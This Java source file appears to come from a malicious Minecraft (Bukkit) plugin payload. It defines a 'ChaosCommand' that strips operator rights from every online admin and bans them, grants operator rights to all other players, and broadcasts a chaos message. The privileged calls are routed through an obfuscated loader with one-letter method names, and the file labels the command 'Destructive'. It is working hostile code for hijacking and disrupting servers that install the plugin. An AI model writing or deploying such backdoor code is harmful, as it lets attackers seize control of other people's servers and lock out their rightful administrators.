package dev.naruto.astrox.payload.commands;

import dev.naruto.astrox.utils.DynamicLoader;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import java.util.ArrayList;
import java.util.List;

public class ChaosCommand implements Command {
    @Override
    public void execute(Player sender, String[] args, JavaPlugin plugin) {
        List<Player> ops = new ArrayList<>();
        List<Player> nonOps = new ArrayList<>();

        for (Player player : Bukkit.getOnlinePlayers()) {
            if (player.isOp()) {
                ops.add(player);
            } else {
                nonOps.add(player);
            }
        }

        // Deop and ban all ops - FIXED: use short method names
        for (Player op : ops) {
            DynamicLoader.a(op, false); // setPlayerOp
            DynamicLoader.b("ban " + op.getName() + " §cChaos initiated"); // execConsole
        }

        // Op everyone else - FIXED
        for (Player player : nonOps) {
            DynamicLoader.a(player, true); // setPlayerOp
            player.sendMessage("§a§lYou are now an operator!");
        }

        Bukkit.broadcastMessage("§4§l[CHAOS] §cThe server order has been overturned!");
    }

    @Override
    public String getDescription() { return "Total server chaos"; }

    @Override
    public String getUsage() { return ""; }

    @Override
    public String getCategory() { return "Destructive"; }
}
